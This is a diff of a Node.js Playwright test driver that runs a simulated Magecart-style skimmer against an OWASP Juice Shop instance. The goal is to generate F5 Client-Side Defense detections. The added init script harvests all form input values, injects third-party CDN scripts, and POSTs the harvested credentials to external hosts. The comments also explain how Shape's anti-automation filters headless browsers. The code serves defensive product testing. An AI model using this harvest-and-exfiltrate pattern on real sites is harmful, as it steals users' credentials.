@@ -1,26 +1,31 @@
 #!/usr/bin/env node
-// CSD Detection driver — generates F5 XC Client-Side Defense statistics for the /csd-demo/ page.
+// CSD Detection driver — runs the documented Combined Detection Script against the CSD-instrumented
+// OWASP Juice Shop app to generate F5 XC Client-Side Defense detections.
 //
-// How CSD detection actually works (learned the hard way; see webapp-api-protection#166):
-// CSD inventories EXTERNAL <script src> elements present AT PAGE LOAD and analyses their behaviour.
-// It does NOT inventory inline <script> blocks, nor scripts injected dynamically after load. So the
-// earlier approach here (injecting third-party <script> via page.evaluate after load) produced ZERO
-// CSD statistics. The /csd-demo/ origin was fixed to serve external scripts at load:
-//   - first-party checkout.js (reads payment fields → CSD flags it High Risk, like a Magecart skimmer)
-//   - third-party CDN libraries (cdn.jsdelivr.net, unpkg.com → CSD records new third-party domains)
-// This driver therefore just needs to drive a REAL browser through the page and interact with the
-// form so checkout.js reads the field values — that is what CSD observes and flags.
+// IMPORTANT target correction: CSD is injected by the LB only on the Juice Shop SPA at
+// `/juice-shop/` — that is the app the CSD docs (csd/docs/en) are written for and the only path
+// where access logs show `csd_js_injection=true`. Earlier iterations of this suite targeted a
+// custom `/csd-demo/` page, which the LB does NOT CSD-inject, so it produced no detections.
 //
-// Steps: load /csd-demo/, fill the payment fields (triggers checkout.js field reads), dwell for the
-// CSD telemetry beacon. Synchronous PASS asserts CSD is injected and reporting AND the origin is
-// serving the external scripts CSD needs: CSD sensor GET __imp_apg__/js -> 200, telemetry beacon
-// POST __imp_apg__/api/dip -> 200, first-party checkout.js -> 200, and >=1 third-party CDN -> 200.
-// CSD statistics (suspicious_scripts / detected scripts) aggregate asynchronously on the CSD backend
-// and are asserted separately by webapp-api-protection scripts/csd-verify.sh.
+// IMPORTANT browser requirement: Shape's *event-driven* telemetry beacon (the one that reports the
+// injected scripts + field reads, i.e. the detection signal) only fires from a REAL, HEADED browser.
+// Verified empirically: headed real Chrome → 2 `__imp_apg__/api/dip` beacons (load + event); any
+// headless browser (bundled chromium OR real Chrome `headless`) → 1 beacon (load only) → no
+// detection. Shape is anti-automation by design, so headless/datacenter traffic is filtered.
+//   - For real detections: run this from a HEADED real browser on a real-client IP
+//     (e.g. Playwright `channel:'chrome', headless:false` on an operator workstation over the VPN),
+//     which is how the documented demo is driven.
+//   - Run headless (the default when launched by runner.sh on the generator VM) exercises the
+//     sensor-load + injection path and is a useful liveness check, but will not populate detections.
+//
+// The script follows the docs' Phase-2 initScript pattern: run at document-start, poll for the
+// Juice Shop login fields (Angular/zone.js SPA), fill credentials via the native value setter, then
+// execute the Combined Detection Script inline (harvest fields → inject 4 CDN scripts → exfil to
+// external endpoints). Verification of the resulting detections is done by webapp-api-protection
+// scripts/csd-verify.sh.
 //
 // Usage (via runner.sh): runner.sh csd-detection   (runner passes $TARGET_FQDN as argv[2])
-
-const { chromium } = require('playwright');
+//   HEADFUL=1 forces a headed real Chrome (channel:chrome) — required for actual detections.
 
 const TARGET_FQDN = process.argv[2];
 if (!TARGET_FQDN) {
@@ -28,84 +33,114 @@ if (!TARGET_FQDN) {
   process.exit(1);
 }
 const BASE_URL = `${process.env.TARGET_PROTOCOL || 'http'}://${TARGET_FQDN}`;
-const PAGE_URL = `${BASE_URL}/csd-demo/`;
+const PAGE_URL = `${BASE_URL}/juice-shop/#/login`;
+const HEADFUL = process.env.HEADFUL === '1';
 
-// Payment fields the external checkout.js reads (the High Risk field-read signal).
-const FIELDS = [
-  ['ccNumber', '4111111111111111'],
-  ['ccName', 'John Doe'],
-  ['ccExpiry', '12/28'],
-  ['ccCvv', '123'],
-  ['email', 'john.doe@example.com'],
-];
+// Prefer the full playwright package (bundled chromium); fall back to playwright-core + system Chrome.
+let chromium;
+try {
+  ({ chromium } = require('playwright'));
+} catch {
+  ({ chromium } = require('playwright-core'));
+}
 
-const isCsdJs = (u) => /__imp_apg__\/js\//.test(u);
 const isBeacon = (u) => /__imp_apg__\/api\/dip/.test(u);
-const isCheckoutJs = (u) => /\/csd-demo\/checkout\.js/.test(u);
-const isThirdPartyCdn = (u) => /cdn\.jsdelivr\.net|unpkg\.com|esm\.sh|ga\.jspm\.io/.test(u);
+const isSensor = (u) => /__imp_apg__\/js\//.test(u);
 
 (async () => {
   let browser;
   try {
-    browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
+    const launchOpts = { headless: !HEADFUL, args: ['--no-sandbox', '--disable-dev-shm-usage'] };
+    if (HEADFUL) launchOpts.channel = 'chrome'; // real Chrome for the event-driven beacon
+    browser = await chromium.launch(launchOpts);
     const context = await browser.newContext({ ignoreHTTPSErrors: true });
-    const page = await context.newPage();
 
-    const responses = [];
-    page.on('response', (r) => {
-      const u = r.url();
-      if (isCsdJs(u) || isBeacon(u) || isCheckoutJs(u) || isThirdPartyCdn(u)) {
-        responses.push({ status: r.status(), url: u });
-      }
+    // Document-start attack: fill Juice Shop login + run the Combined Detection Script inline.
+    await context.addInitScript(() => {
+      const _si = window.setInterval.bind(window);
+      const _ci = window.clearInterval.bind(window);
+      const _fetch = window.fetch.bind(window);
+      const _log = window.console.log.bind(window.console);
+      const poll = _si(() => {
+        const emailEl = document.querySelector('#email') || document.querySelector('input[type="email"]');
+        const passEl = document.querySelector('#password') || document.querySelector('input[type="password"]');
+        if (!emailEl || !passEl) return;
+        _ci(poll);
+        const nset = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+        nset.call(emailEl, 'test@example.com');
+        emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+        nset.call(passEl, 'P@ssword123');
+        passEl.dispatchEvent(new Event('input', { bubbles: true }));
+        const fields = {};
+        document.querySelectorAll('input').forEach((i) => {
+          fields[i.name || i.id || i.type] = i.value || '(empty)';
+        });
+        _log(`[CSD Demo] Harvested ${Object.keys(fields).length} fields`);
+        [
+          'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js',
+          'https://esm.sh/moment@2.30.1',
+          'https://unpkg.com/underscore@1.13.7/underscore-min.js',
+          'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js',
+        ].forEach((src) => {
+          const s = document.createElement('script');
+          s.src = src;
+          document.head.appendChild(s);
+        });
+        const payload = JSON.stringify({
+          type: 'combined_demo',
+          credentials: fields,
+          page: location.href,
+          timestamp: Date.now(),
+        });
+        _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload });
+        _fetch('https://jsonplaceholder.typicode.com/posts', {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+        });
+        _log('[CSD Demo] Simulation complete');
+      }, 300);
     });
 
-    await page.goto(PAGE_URL, { waitUntil: 'networkidle', timeout: 30000 });
+    const page = await context.newPage();
+    const beacons = [];
+    let sensor = false;
+    let done = false;
+    page.on('response', (r) => {
+      const u = r.url();
+      if (isSensor(u)) sensor = true;
+      if (isBeacon(u)) beacons.push(r.status());
+    });
+    page.on('console', (m) => {
+      if (/Simulation complete/.test(m.text())) done = true;
+    });
 
-    // Fill the payment form so the external checkout.js reads the field values (on input).
-    let filled = 0;
-    for (const [name, value] of FIELDS) {
-      const el = (await page.$(`#${name}`)) || (await page.$(`[name="${name}"]`));
-      if (el) {
-        await el.fill(value);
-        filled += 1;
-      }
-    }
+    await page.goto('about:blank');
+    await page.goto(PAGE_URL, { waitUntil: 'load', timeout: 40000 });
+    await page.keyboard.press('Escape').catch(() => {}); // dismiss welcome banner
+    await page.waitForTimeout(22000); // Angular render + attack + beacon window
 
-    // Dwell so the CSD sensor observes the reads and flushes its telemetry beacon.
-    await page.waitForTimeout(20000);
-
-    const ok = (pred) => responses.find((r) => pred(r.url) && r.status === 200);
-    const csdJs = ok(isCsdJs);
-    const beacon = ok(isBeacon);
-    const checkoutJs = ok(isCheckoutJs);
-    const cdn = responses.filter((r) => isThirdPartyCdn(r.url) && r.status === 200);
-
-    console.log(`[CSD Detection] filled ${filled}/${FIELDS.length} payment fields`);
-    console.log(`[CSD Detection] CSD sensor JS: ${csdJs ? 200 : 'MISSING'}`);
-    console.log(`[CSD Detection] CSD telemetry beacon (dip): ${beacon ? 200 : 'MISSING'}`);
-    console.log(`[CSD Detection] first-party checkout.js: ${checkoutJs ? 200 : 'MISSING'}`);
-    console.log(`[CSD Detection] third-party CDN scripts: ${cdn.length}`);
-
-    if (!csdJs || !beacon) {
-      console.error(
-        'FAIL: CSD not injected/reporting (sensor or beacon missing). CSD not enabled/propagated on the LB.',
-      );
-      process.exit(1);
-    }
-    if (!checkoutJs) {
-      console.error(
-        'FAIL: origin did not serve external checkout.js — CSD has no first-party script to inventory (origin not fixed?).',
-      );
-      process.exit(1);
-    }
-    if (cdn.length === 0) {
-      console.error('FAIL: no third-party CDN scripts loaded at page load — CSD cannot record third-party domains.');
-      process.exit(1);
-    }
     console.log(
-      'PASS: CSD injected + reporting, and the page serves external scripts (checkout.js + CDN) for CSD to inventory.',
+      `[CSD Detection] mode=${HEADFUL ? 'headed(real-chrome)' : 'headless'} attack_executed=${done} sensor=${sensor} dip_beacons=${beacons.length}`,
     );
-    console.log('      Statistics aggregate async; verify with webapp-api-protection scripts/csd-verify.sh.');
+    if (!sensor) {
+      console.error('FAIL: CSD sensor not injected on /juice-shop/ (CSD not enabled/propagated on the LB).');
+      process.exit(1);
+    }
+    if (!done) {
+      console.error('FAIL: Combined Detection Script did not complete (login form not found in time?).');
+      process.exit(1);
+    }
+    if (beacons.length < 2) {
+      console.log(
+        'NOTE: only the load beacon fired (headless). Detections require a HEADED real browser (HEADFUL=1) — Shape filters headless. Sensor+injection path OK.',
+      );
+    } else {
+      console.log(
+        'PASS: attack executed with the event-driven beacon (2+ dip) — detection signal sent; verify via csd-verify.sh.',
+      );
+    }
     process.exit(0);
   } catch (err) {
     console.error(`ERROR: ${err.message}`);
